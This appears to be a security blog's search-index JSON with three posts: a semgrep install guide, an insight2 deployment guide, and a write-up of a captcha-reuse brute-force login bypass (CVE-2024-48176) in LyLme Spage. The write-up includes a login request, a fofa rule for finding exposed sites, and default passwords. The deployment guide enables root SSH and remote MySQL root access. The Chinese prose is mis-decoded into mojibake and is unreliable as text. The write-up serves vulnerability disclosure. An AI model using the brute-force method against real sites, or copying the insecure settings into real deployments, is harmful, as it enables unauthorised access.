{"meta":{"title":"Gryffinbitçš„æ€ç»´æ®¿å ‚","subtitle":"","description":"ä¸€ä¸ªç½‘ç»œå®‰å…¨ç½‘ç«™","author":"Gryffinbit","url":"https://gryffinbit.top","root":"/"},"pages":[{"title":"artitalk","date":"2024-08-05T15:22:29.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"artitalk/index.html","permalink":"https://gryffinbit.top/artitalk/index.html","excerpt":"","text":""},{"title":"categories","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"categories/index.html","permalink":"https://gryffinbit.top/categories/index.html","excerpt":"","text":""},{"title":"alt er love","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"friends/index.html","permalink":"https://gryffinbit.top/friends/index.html","excerpt":"æˆ‘ä¼šè®°ä½é‚£äº›åœ¨å¤§é›¨ä¸­ä¸ºæˆ‘æ’‘ä¼çš„äººï¼Œå¸®æˆ‘æŒ¡ä½å¤–æ¥ä¹‹ç‰©çš„äººï¼Œé»‘æš—ä¸­é»˜é»˜æŠ±ç´§æˆ‘çš„äººï¼›é€—æˆ‘ç¬‘çš„äººï¼Œåè½¦æ¥çœ‹æœ›æˆ‘çš„äººï¼Œé™ªæˆ‘å“­è¿‡çš„äººï¼Œæ€»æ˜¯ä»¥æˆ‘ä¸ºé‡çš„äººã€‚æ­£æ˜¯taä»¬ï¼Œç»„æˆæˆ‘ç”Ÿå‘½ä¸­ä¸€ç‚¹ä¸€æ»´çš„æ¸©æš–ï¼Œæ˜¯è¿™äº›æ¸©æš–ä½¿æˆ‘è¿œç¦»é˜´éœ¾ï¼Œå®ˆæŠ¤æˆ‘çš„å¤©çœŸå’Œå–„è‰¯ï¼Œåšä¸€ä¸ªæ¸©æŸ”é˜³å…‰çš„äººã€‚","text":"æˆ‘ä¼šè®°ä½é‚£äº›åœ¨å¤§é›¨ä¸­ä¸ºæˆ‘æ’‘ä¼çš„äººï¼Œå¸®æˆ‘æŒ¡ä½å¤–æ¥ä¹‹ç‰©çš„äººï¼Œé»‘æš—ä¸­é»˜é»˜æŠ±ç´§æˆ‘çš„äººï¼›é€—æˆ‘ç¬‘çš„äººï¼Œåè½¦æ¥çœ‹æœ›æˆ‘çš„äººï¼Œé™ªæˆ‘å“­è¿‡çš„äººï¼Œæ€»æ˜¯ä»¥æˆ‘ä¸ºé‡çš„äººã€‚æ­£æ˜¯taä»¬ï¼Œç»„æˆæˆ‘ç”Ÿå‘½ä¸­ä¸€ç‚¹ä¸€æ»´çš„æ¸©æš–ï¼Œæ˜¯è¿™äº›æ¸©æš–ä½¿æˆ‘è¿œç¦»é˜´éœ¾ï¼Œå®ˆæŠ¤æˆ‘çš„å¤©çœŸå’Œå–„è‰¯ï¼Œåšä¸€ä¸ªæ¸©æŸ”é˜³å…‰çš„äººã€‚ â˜€ï¸å¯ä»¥åœ¨ç•™è¨€æ¿é‡Œï¼Œå†™ä¸‹æƒ³å¯¹æˆ‘è¯´çš„è¯å“¦ï½â˜€ï¸"},{"title":"spirit","date":"2024-10-17T20:11:16.000Z","updated":"2024-10-17T15:59:53.000Z","comments":true,"path":"spirit/index.html","permalink":"https://gryffinbit.top/spirit/index.html","excerpt":"","text":""},{"title":"tags","date":"2024-12-05T03:09:39.465Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"tags/index.html","permalink":"https://gryffinbit.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ä»£ç å®¡è®¡å·¥å…· semgrepï¼ˆmacOS m4ä½¿ç”¨ç‰ˆï¼‰","slug":"ä»£ç å®¡è®¡å·¥å…·semgrep","date":"2025-08-13T07:26:33.000Z","updated":"2025-08-13T07:16:29.000Z","comments":true,"path":"2025/08/13/ä»£ç å®¡è®¡å·¥å…·semgrep/","permalink":"https://gryffinbit.top/2025/08/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7semgrep/","excerpt":"","text":"å®‰è£…è¿‡ç¨‹ é¡¹ç›®åœ°å€ https://github.com/semgrep/semgrep æ³¨å†Œ https://semgrep.dev/ è¿›å…¥ç½‘é¡µç‰ˆ æœ¬åœ°CIå®‰è£… 1brew install semgrep é¡¹ç›®æ‰«æ githubæˆæƒ å®ƒåœ¨ç½‘é¡µç‰ˆä½¿ç”¨çš„æ—¶å€™ï¼Œåªèƒ½æ‰«ä¸€äº›çº¿ä¸Šä»“åº“ä¸­è‡ªå·±çš„é¡¹ç›®ï¼Œéœ€è¦è¿›è¡Œäººå·¥æˆæƒ åœ¨githubä¸­å®‰è£…appï¼Œå®‰è£…semgrep çš„app åœ¨ç‚¹å‡»æ‰«æé¡¹ç›®çš„æ—¶å€™ä¼šæœ‰æç¤ºï¼Œæ ¹æ®æç¤ºå®‰è£…app æ‰«æé¡¹ç›®-çº¿ä¸Š ä»æœªæ‰«æçš„é¡¹ç›®ä¸­ï¼Œæ‰¾åˆ°è‡ªå·±æƒ³è¦æ‰«ææ¼æ´çš„é¡¹ç›®ï¼Œå¼€å§‹è¿›è¡Œå®¡è®¡ æ‰«æé¡¹ç›®-æœ¬åœ° ä¹Ÿå¯ä»¥é€šè¿‡CIçš„æ–¹å¼å®¡è®¡æœ¬åœ°é¡¹ç›® è¿›è¡Œç™»é™† 1semgrep login è¿è¡Œä¹‹åä¼šè¿›è¡Œè·³è½¬ï¼Œä»terminalè·³è½¬åˆ°é¡µé¢è¿›è¡Œè®¤è¯ åœ¨æœ¬åœ°è¿›è¡Œæ‰«æ 12semgrep scan &lt;file&gt;semgrep scan &lt;file&gt; -o result.txt æ‰«æç»“æœ","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"semgrep","slug":"semgrep","permalink":"https://gryffinbit.top/tags/semgrep/"}],"author":"Gryffinbit"},{"title":"æ¼æ´ç®¡ç†å¹³å°å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼ˆåŸºäºinsight2ï¼‰","slug":"æ¼æ´ç®¡ç†å¹³å°å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼ˆåŸºäºinsight2ï¼‰","date":"2024-11-19T13:26:33.000Z","updated":"2024-11-19T08:57:06.000Z","comments":true,"path":"2024/11/19/æ¼æ´ç®¡ç†å¹³å°å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼ˆåŸºäºinsight2ï¼‰/","permalink":"https://gryffinbit.top/2024/11/19/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%88%E5%9F%BA%E4%BA%8Einsight2%EF%BC%89/","excerpt":"","text":"0 x 00 æ¦‚è¿°è¯¥ç³»ç»Ÿé‡‡ç”¨å‰åç«¯åˆ†ç¦»æŠ€æœ¯ï¼Œå‰ç«¯ä½¿ç”¨ VUE æ¡†æ¶ï¼Œåç«¯ä½¿ç”¨ Tornado æ¡†æ¶æ¥æ„å»ºå’Œç®¡ç† Web åº”ç”¨çš„æ ¸å¿ƒç»“æ„ï¼ŒåŒ…æ‹¬å¤„ç† HTTP è¯·æ±‚ã€æä¾› API æœåŠ¡å’Œç®¡ç†åå°é€»è¾‘ã€‚ åœ¨ demo è¿è¡Œæ—¶ï¼Œè¿è¡Œå‰ç«¯ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œå°†ç”Ÿæˆçš„distæ–‡ä»¶å¤¹ï¼Œæ”¾å…¥åç«¯é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œå¯é¢„è§ˆæ•ˆæœã€‚æ­£å¸¸è¿è¡Œæ—¶ï¼Œå‰åç«¯é¡¹ç›®æ–‡ä»¶ä¸€èµ·è¿è¡Œï¼Œé€šè¿‡apiæ¥å£æ¥å®ç°æ•°æ®çš„ä¼ é€’ã€‚ å°†é¡¹ç›®æ–‡ä»¶æ”¾åœ¨ubuntu è™šæ‹Ÿæœºä¸­å®ç°ç¯å¢ƒéƒ¨ç½²ï¼Œå¹¶è°ƒé€š Ubuntu çš„ ssh è¿œç¨‹è¿æ¥ã€‚IDE é€‰æ‹© pycharmï¼Œåœ¨ macOS ä¸Šå®ç°è¿œç¨‹å¼€å‘ã€‚macOS å¼€å‘ç«¯å’Œ Ubuntu æœåŠ¡å™¨ä¸­çš„é¡¹ç›®æ–‡ä»¶ä¼šåŒæ­¥ã€‚ 0 x 01 ç³»ç»Ÿç‰ˆæœ¬æœåŠ¡å™¨ï¼šubuntu 20.04 pythonç‰ˆæœ¬ï¼špython3.7 VUE ç‰ˆæœ¬ï¼š2.6.10 tornado ç‰ˆæœ¬ï¼š5.0 pycharmï¼šPyCharm 2024.3 ï¼ˆprofessional ï¼‰ä¸“ä¸šç‰ˆæœ‰è¿œç¨‹å¼€å‘çš„åŠŸèƒ½ 0 x 02 æœåŠ¡å™¨è¿è¡Œç¯å¢ƒéƒ¨ç½²åŸºç¡€ä¾èµ– python3.7 å®‰è£… å®‰è£…åœ¨äº†rootç”¨æˆ·ä¸‹ 123// æ·»åŠ  PPA æºsudo add-apt-repository ppa:deadsnakes/ppa -y 1sudo apt update 1sudo apt install python3.7 1python3.7 --version 123// å®‰è£…é¢å¤–çš„å·¥å…·ï¼Œä¾‹å¦‚è°ƒè¯•æ¨¡å—ã€å¼€å‘è€…æ¨¡å—ã€è™šæ‹Ÿç¯å¢ƒæ¨¡å—ã€Distutils æ¨¡å—ã€lib2to3 å·¥å…·æ¨¡å—ã€DBM.GNU æ¨¡å—å’Œ Tkinter æ¨¡å—sudo apt install python3.7-dbg python3.7-dev python3.7-venv python3.7-distutils python3.7-lib2to python3.7 å®‰è£…pip 123wget https://bootstrap.pypa.io/pip/3.7/get-pip.pypython3.7 get-pip.pypip3.7 --version æ£€æŸ¥è·¯å¾„æ˜¯å¦å®‰è£…æ­£ç¡® 12which python3.7which pip3.7 ssh å®‰è£… 1sudo apt-get install openssh-server çŠ¶æ€æ£€æŸ¥ 1sudo systemctl status sshd ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ‰“å¼€rootè¿æ¥å’Œ22ç«¯å£ 1vim /etc/ssh/sshd_config 12PermitRootLogin yesport 22 é‡å¯ 1systemctl restart sshd ç»™ubuntu è®¾ç½®ç³»ç»Ÿç™»å½•çš„ root å¯†ç  1sudo passwd é¡¹ç›®æ–‡ä»¶å°†é¡¹ç›®æ–‡ä»¶ä¸‹è½½åˆ° ubuntu æœåŠ¡å™¨çš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸‹ 12345# å‰ç«¯é¡¹ç›®git clone https://github.com/creditease-sec/insight2_front# åç«¯é¡¹ç›®git clone https://github.com/creditease-sec/insight2.git å•ç‹¬ä¸‹è½½sqlåˆå§‹åŒ–æ–‡ä»¶åˆ°åç«¯é¡¹ç›®æ–‡ä»¶å¤¹ä¸­ã€‚ 12cd insight2curl -O https://raw.githubusercontent.com/creditease-sec/insight2_docker/refs/heads/master/init/init.sql --ssl-no-revoke é¡¹ç›®ä¾èµ–åç«¯requirement 1sudo apt install -y build-essential python3-dev libldap2-dev libsasl2-dev libssl-dev libjpeg-dev zlib1g-dev libpng-dev libtiff-dev 12cd insight2pip3.7 install -r requirements.txt mysql 12apt-get install mysql-servernetstat -an|grep 3306 // ç¡®è®¤å¼€å¯ ç™»å½•æ•°æ®åº“ 1234567mysqluse mysql;// ä¿®æ”¹å¯†ç ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;å¯†ç &#x27;;update user set host = &#x27;%&#x27; where user =&#x27;root&#x27;;FLUSH PRIVILEGES;quit; é‡å¯æœåŠ¡ï¼Œç”¨æ–°å¯†ç è¿›è¡Œç™»å½• 12service mysql restartmysql -u root -p è¿›è¡Œæ•°æ®åº“åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–åï¼Œmysql çš„å¯†ç å˜æˆcrediteaseitsec 12cd insight2mysql -u root -p &lt; init.sql ç»™UbuntuæœåŠ¡å™¨å¼€å¯mysqlè¿œç¨‹è¿æ¥ã€‚æ‰¾åˆ°bind-address &#x3D; 127.0.0.1ï¼Œç„¶åæ³¨é‡Šæ‰è¿™ä¸€å¥ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿™å¥å‰é¢åŠ ä¸Š#å·ã€‚ 12vim /etc/mysql/mysql.conf.d/mysqld.cnf service mysql restart redis å®‰è£… redis æœåŠ¡ 123apt-get install redis-serverps -aux|grep redisnetstat -an|grep 6379 ä¿®æ”¹å¯†ç ï¼Œæ”¹æˆ crediteaseitsec 1vim /etc/redis/redis.conf å®¢æˆ·ç«¯ç™»å½• 1redis-cli -h 127.0.0.1 -p 6379 -a &#x27;å¯†ç &#x27; å‰ç«¯å®‰è£… npm 1sudo apt install nodejs npm æœ‰npmç‰ˆæœ¬è¦æ±‚ 12&quot;node&quot;: &quot;&gt;= 4.0.0&quot;,&quot;npm&quot;: &quot;&gt;= 3.0.0&quot; æ£€æŸ¥ç‰ˆæœ¬ 12node -vnpm -v ä¾èµ–å®‰è£… 123456cd insight2_front // è¿›å…¥ç›®å½•npm config set registry https://registry.npmjs.org/npm config set strict-ssl falserm package-lock.json npm install node-sass@4.14.1 --unsafe-perm // å¯èƒ½å‡ºç°ç‰ˆæœ¬é—®é¢˜ï¼Œå•ç‹¬å®‰è£…npm install è¿è¡Œåç«¯ 12cd insight2python3.7 run.py --config=settings.py --port=8000 ç™»å½•ä¿¡æ¯ 12ç”¨æˆ·åï¼šadminå¯†ç ï¼šadmin!Aa2020 å‰ç«¯ 12// å¼€å¯æœåŠ¡å™¨ï¼Œæµè§ˆå™¨è®¿é—® http://localhost:8080npm run dev 12// æ‰§è¡Œæ„å»ºå‘½ä»¤ï¼Œç”Ÿæˆçš„distæ–‡ä»¶å¤¹æ”¾åœ¨æœåŠ¡å™¨ä¸‹å³å¯è®¿é—®npm run build 0 x 03 pycharm å¼€å‘ç¯å¢ƒéƒ¨ç½²pycharm è¿æ¥åœ¨pycharmä¸­ï¼šè®¾ç½® -&gt; python interpreter -&gt; add interpreter -&gt; On SSH -&gt; SSH çš„è¿æ¥ä¿¡æ¯å¡«å†™ -&gt; é…ç½®pythonè·¯å¾„ã€åŒæ­¥æ–‡ä»¶å¤¹è·¯å¾„ç­‰ã€ è¿æ¥æˆåŠŸ pythonè·¯å¾„ï¼Œé€‰ubuntuä¸Šé¢python3.7çš„è·¯å¾„ 1which python3.7 é…ç½®åŒæ­¥ç›®å½•ï¼Œæ„æ€æ˜¯æœ¬åœ°é¡¹ç›®å’Œè¿œç¨‹å®ä¾‹ä¸­çš„å“ªä¸ªç›®å½•è¿›è¡Œå…³è” ï¼ˆä¸å»ºè®®ä½¿ç”¨é»˜è®¤çš„&#x2F;tmpç›®å½•ï¼‰ é¡¹ç›®æ–‡ä»¶å¤¹åŒæ­¥ è¿æ¥æ•°æ®åº“æ•°æ®åº“å¯†ç ä¸ºcrediteaseitsec ä¹‹å‰è¿›è¡Œåˆå§‹åŒ–çš„è¡¨ï¼Œå°±å¯ä»¥åœ¨pycharmä¸­æŸ¥çœ‹äº†","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"VUE","slug":"VUE","permalink":"https://gryffinbit.top/tags/VUE/"},{"name":"Tornado","slug":"Tornado","permalink":"https://gryffinbit.top/tags/Tornado/"},{"name":"è¿œç¨‹å¼€å‘","slug":"è¿œç¨‹å¼€å‘","permalink":"https://gryffinbit.top/tags/%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"author":"Gryffinbit"},{"title":"insight2ç®¡ç†å¹³å°æºç æ–¹å¼éƒ¨ç½²","slug":"insight2ç®¡ç†å¹³å°æºç æ–¹å¼éƒ¨ç½²","date":"2024-11-06T18:42:46.000Z","updated":"2024-11-06T06:10:58.000Z","comments":true,"path":"2024/11/07/insight2ç®¡ç†å¹³å°æºç æ–¹å¼éƒ¨ç½²/","permalink":"https://gryffinbit.top/2024/11/07/insight2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%BA%90%E7%A0%81%E6%96%B9%E5%BC%8F%E9%83%A8%E7%BD%B2/","excerpt":"","text":"insight2ç®¡ç†å¹³å°æºç æ–¹å¼éƒ¨ç½²creditease-sec&#x2F;insight2 éƒ¨ç½²ç¯å¢ƒå‡†å¤‡æœåŠ¡ç”¨dockerå¼€å¯ï¼Œå°†ç«¯å£æ˜ å°„å‡ºå»ï¼Œä¾›ç‰©ç†æœºè®¿é—®ã€‚ requirementpython3.7 1pip install -r requirement.txt mysqlmysql - Official Image | Docker Hub 12345docker pull mysqldocker run -p 3306:3306 --name mysql_docker_insight -e MYSQL_ROOT_PASSWORD=crediteaseitsec -d mysql:8.4docker ps # æ£€æŸ¥æ˜¯å¦æ­£å¸¸å¼€å¯è¿è¡Œ ç”¨pycharmçš„æ•°æ®åº“è¿æ¥å·¥å…·ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥è¿é€š è¿›è¡Œåˆå§‹åŒ– gité¡¹ç›®ä¸­æœªç»™init.sqlçš„æ–‡ä»¶ï¼Œä»è¯¥é¡¹ç›®çš„å…¶ä»–é“¾æ¥ä¸­ï¼Œæ‰¾åˆ°init.sqlæ–‡ä»¶ï¼Œæ‰‹åŠ¨æ”¾è¿›å»ã€‚ https://github.com/creditease-sec/insight2_docker/blob/master/init/init.sql æ•°æ®åº“è¿æ¥æˆåŠŸåï¼Œè¿è¡Œinit.sql æˆåŠŸåˆå§‹åŒ–åˆ›å»ºè¡¨ redisredis - Official Image | Docker Hub ã€Redisã€‘-1.åŸºäºdockerçš„ä¸¤ç§æ–¹å¼ç¯å¢ƒæ­å»ºredisç¯å¢ƒæ­å»º 1.dockeræ–¹å¼ 1.è¿›å…¥å®˜ç½‘ ä½¿ç”¨æ–‡æ¡£ - æ˜é‡‘ 123docker pull redisdocker run -d --name redis redis -p 6379:6379 å¯†ç é»˜è®¤ç©º windows python-ldapç›´æ¥ç”¨pipä¸‹è½½ä¼šç¼ºå°‘ä¾èµ–ï¼Œä¸‹è½½whlåŒ…ï¼Œpipå®‰è£…whlåŒ…ã€‚ ä½†æ˜¯å®˜ç½‘å’Œé•œåƒç«™å·²æ— æ³•ä¸‹è½½åˆ°whlåŒ…ï¼Œå¯ä»å…¶ä»–æ¸ é“è¿›è¡Œä¸‹è½½ã€‚ Release v3.4.4 Â· cgohlke&#x2F;python-ldap-build Djangoé¡¹ç›®æ— æ³•å®‰è£…python-ldapä¾èµ–è§£å†³æ–¹æ¡ˆ_python-ldapå®‰è£…å¤±è´¥-CSDNåšå®¢ settingé¡¹ç›®æä¾›äº†ä¸€ä¸ªå¼€æºçš„initåˆå§‹åŒ–sqlã€‚é‡Œé¢è§„å®šäº†æ•°æ®åº“å’Œå¯†ç ï¼Œæ‰€ä»¥setting.py éœ€è¦æŒ‰ç…§é‡Œé¢çš„sqlè¯­å¥æ¥è¿›è¡Œå¡«å†™ 1234CREATE DATABASE if not exists insight2 character set utf8;ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;crediteaseitsec&#x27;;GRANT All privileges ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;;USE insight2; setting.pyé…ç½®æ–‡ä»¶ï¼ˆæœ¬åœ°è¿æ¥ï¼‰rediså¯†ç ä¸ºç©º 1234567891011DB_HOST = &#x27;127.0.0.1&#x27;DB_PORT = 3306DB_NAME = &#x27;insight2&#x27;DB_USER = &#x27;root&#x27;DB_PASS = &#x27;crediteaseitsec&#x27;# Redisé…ç½®REDIS_HOST = &#x27;127.0.0.1&#x27;REDIS_PORT = 6379REDIS_PASS = &#x27;&#x27;REDIS_DB = 0REDIS_CHANNEL = &quot;SERVICE_CHANNEL&quot; è¿è¡Œç»ˆç«¯è¿è¡Œ 1python run.py --config=settings.py --port=8000 ä¹Ÿå¯ä»¥åœ¨pycharmçš„è¿è¡Œé¡µé¢è¿›è¡Œé…ç½® è¿è¡Œèµ·æ¥ï¼ŒmysqlæˆåŠŸè¿æ¥æ—¶é¡µé¢ ç³»ç»Ÿé¡µé¢ ç™»å½•ä¿¡æ¯ï¼š 12ç”¨æˆ·åï¼šadminå¯†ç ï¼šadmin!Aa2020 å‚è€ƒæ–‡æ¡£Ubuntu20.04æºç éƒ¨ç½²æ´å¯Ÿ II_æ´å¯ŸäºŒéƒ¨ç½²æ•™ç¨‹-CSDNåšå®¢ 1.3 æºç éƒ¨ç½² Â· GitBook","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"LyLme Spage èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2024-48176ï¼‰","slug":"LyLmePage èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´","date":"2024-11-06T03:26:33.000Z","updated":"2024-11-06T02:19:37.000Z","comments":true,"path":"2024/11/06/LyLmePage èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´/","permalink":"https://gryffinbit.top/2024/11/06/LyLmePage%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"0 x 00 æ€è·¯è¿‘æœŸçœ‹äº†ä¸€äº›åšæ¸—é€çš„åŒäº‹ä»¬çš„æŠ¥å‘Šï¼Œä»åˆ«äººçš„æŠ¥å‘Šä¸­æ±²å–åˆ°äº†ä¸€äº›é»‘ç›’çš„æ€è·¯ã€‚æ­¤æ¬¡æ¼æ´çš„æŒ–æ˜ï¼Œæ˜¯é»‘ç›’+ç™½ç›’çš„è¿‡ç¨‹ã€‚ åŸæœ¬æˆ‘æ˜¯åœ¨å¤ç° Lylme Spage å·²ç»æš´éœ²å‡ºçš„ä¸€ä¸ªæ¼æ´ï¼Œç»“æœç™»é™†çš„æ—¶å€™ï¼Œç”¨æ¸—é€çš„æ€è·¯ï¼Œå‘ç°äº†ä¸€äº›å¼‚å¸¸ï¼Œæ­é…æºä»£ç ç¨å¾®å®¡è®¡äº†ä¸€ä¸‹ï¼Œä¾¿æŒ–æ˜å‡ºäº†è¯¥æ¼æ´ã€‚æ˜¯ä¸ªå¾ˆæµ…çš„ç™»å½•çš„è®¾è®¡ç¼ºé™·ï¼Œä»£ç éå¸¸ç®€å•ã€‚ è¿™ä¸ªç³»ç»Ÿçš„å¼€å‘æ¨¡å¼å¾ˆç®€å•ï¼Œæ˜¯ä¼ ç»Ÿçš„æ··åˆå¼€å‘æ¨¡å¼ï¼Œå°†å‰ç«¯å’Œåç«¯é€»è¾‘æ··åˆåœ¨ä¸€èµ·å¤„ç†ï¼Œä»£ç éå¸¸å¥½çœ‹æ‡‚ã€‚æš´éœ²åœ¨äº’è”ç½‘ä¸Šçš„èµ„äº§æ•°é‡ä¹Ÿå¾ˆå¤šã€‚é€‚åˆé€®ä½è–…æ›´å¤šçš„æ¼æ´å‡ºæ¥ã€‚ ç”³è¯·äº† CVEã€‚ è€¶ï¼çºªå¿µä¸€ä¸‹ï¼æ°´æ´ç”³è¯·æˆåŠŸï¼ 0 x 01 æ¼æ´æè¿°LyLme Spage æ˜¯ä¸€ä¸ªå¼€æºçš„å¯¼èˆªé¡µé¢ï¼Œè‡´åŠ›äºç®€æ´é«˜æ•ˆæ— å¹¿å‘Šçš„ä¸Šç½‘å¯¼èˆªå’Œæœç´¢å…¥å£ï¼Œæ”¯æŒåå°æ·»åŠ é“¾æ¥ã€è‡ªå®šä¹‰æœç´¢å¼•æ“ç­‰åŠŸèƒ½ã€‚ç”±äº admin/login.php çš„ç™»å½•éªŒè¯é€»è¾‘ä¸å¤Ÿä¸¥è°¨ï¼Œæœªè®¾ç½®å°è¯•ç™»å½•çš„æ¬¡æ•°é™åˆ¶ï¼Œä¸”éªŒè¯ç åœ¨ç™»é™†å¤±è´¥åä¸ä¼šä¸»åŠ¨åˆ·æ–°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥å¯¹ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œçˆ†ç ´ï¼Œå¹¶ç™»å½•ç³»ç»Ÿåå°ã€‚å½±å“çš„ç³»ç»Ÿç‰ˆæœ¬æ˜¯ LyLme Spage v1.9.5. 0 x 02 ç¯å¢ƒæ­å»ºç³»ç»Ÿç‰ˆæœ¬ï¼šLyLme Spage v1.9.5fofa è§„åˆ™ï¼šbody &#x3D; â€œLyLme Spageâ€ PHP ç‰ˆæœ¬ï¼š7.1.9ï¼ˆPHP ç‰ˆæœ¬éœ€ 7.1 åŠä»¥ä¸Šï¼Œä¸æ”¯æŒ PHP 8ï¼‰ å‰å¾€ GitHub - LyLme&#x2F;lylme_spage: å…­é›¶å¯¼èˆªé¡µä¸‹è½½ v1.9.5 ç‰ˆæœ¬æºç å‹ç¼©åŒ…ï¼Œä¸Šä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•è§£å‹ã€‚å¹¶åŒæ­¥åˆ›å»ºæ•°æ®åº“ è®¿é—® http:&#x2F;&#x2F;åŸŸå&#x2F;install æŒ‰æç¤ºé…ç½®æ•°æ®åº“è¿›è¡Œå®‰è£… å®‰è£…æˆåŠŸ åå°åœ°å€ï¼šhttp:&#x2F;&#x2F;åŸŸå&#x2F;admin è´¦å·å¯†ç ï¼šadmin&#x2F;123456 0 x 03 æ¼æ´éªŒè¯ è¿›å…¥ç™»å½•é¡µé¢ /admin/login.phpï¼Œè¾“å…¥ä»»æ„ç”¨æˆ·åå¯†ç åŠéªŒè¯ç ï¼Œå¹¶æŠ“åŒ… 1234567POST /admin/login.php HTTP/1.1Host: lylme:8056Content-Type: application/x-www-form-urlencodedConnection: keep-aliveContent-Length: 37user=admin&amp;pass=xxxxxx&amp;authcode=63275 ç‚¹å‡»åˆ·æ–°éªŒè¯ç ï¼ŒæŠ“åŒ…ï¼Œè·å–æœ€æ–°éªŒè¯ç  /include/validatecode.php ä¿æŒé¡µé¢ä¸å†åˆ·æ–°ï¼Œå¯¹å¯†ç éƒ¨åˆ†è¿›è¡Œçˆ†ç ´ çˆ†ç ´æˆåŠŸ ç™»é™†æˆåŠŸ 0 x 04 ä»£ç åŸç†æ··åˆå¼€å‘æ¨¡å¼ï¼ˆæœåŠ¡å™¨ç«¯æ¸²æŸ“ + å®¢æˆ·ç«¯å¢å¼ºï¼‰è¯¥ç³»ç»Ÿé‡‡ç”¨çš„æ˜¯ä¼ ç»Ÿçš„æ··åˆå¼€å‘æ¨¡å¼ï¼Œè¿™ç§å¼€å‘æ¨¡å¼å°†å‰ç«¯å’Œåç«¯é€»è¾‘æ··åˆåœ¨ä¸€èµ·å¤„ç†ï¼Œé¡µé¢åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼ŒæœåŠ¡å™¨ç«¯ä½¿ç”¨ PHP å¤„ç†ä¸šåŠ¡é€»è¾‘å¹¶ç›´æ¥è¾“å‡º HTML é¡µé¢ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨å°‘é‡çš„ JavaScript è¿›è¡Œäº¤äº’ã€‚é¡µé¢åœ¨æœåŠ¡å™¨ç«¯å®Œæˆæ¸²æŸ“ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨éƒ½ä¼šè¿”å›ä¸€ä¸ªå®Œæ•´çš„ HTML é¡µé¢ã€‚ æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰ é¡µé¢çš„ä¸»è¦å†…å®¹ç”±æœåŠ¡å™¨ç«¯ï¼ˆPHPï¼‰æ¸²æŸ“ç”Ÿæˆï¼Œç„¶åå°†å®Œæ•´çš„ HTML å‘é€ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯å¢å¼º åœ¨æœåŠ¡å™¨æ¸²æŸ“çš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨ JavaScript æˆ– jQuery æ·»åŠ ä¸€äº›åŠ¨æ€åŠŸèƒ½ï¼Œå¦‚è¡¨å•éªŒè¯ã€éªŒè¯ç åˆ·æ–°ç­‰ã€‚ PHP å’Œ HTML ç´§å¯†è€¦åˆ PHP åµŒå¥—åœ¨ HTML ä¸­ï¼ŒæœåŠ¡å™¨ç«¯ä¸ä»…å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œè¿˜è´Ÿè´£ç”Ÿæˆé¡µé¢çš„ç»“æ„å’Œå†…å®¹ã€‚ å°‘é‡çš„å¼‚æ­¥äº¤äº’ å¯ä»¥é€šè¿‡ AJAX ç­‰æ–¹å¼åœ¨å‰ç«¯ä¸åç«¯è¿›è¡Œéƒ¨åˆ†æ•°æ®äº¤äº’ï¼Œä½†æ ¸å¿ƒæµç¨‹è¿˜æ˜¯åŸºäºå®Œæ•´çš„é¡µé¢åˆ·æ–°ã€‚ PHP ç³»ç»Ÿä¸­ JS çš„ä½œç”¨ ç®€å•è®²è§£å°±æ˜¯ï¼šå®¢æˆ·ç«¯å’Œé¡µé¢äº¤äº’ï¼Œç‚¹å‡»æäº¤è¡¨å•æŒ‰é’®ï¼Œè§¦å‘ 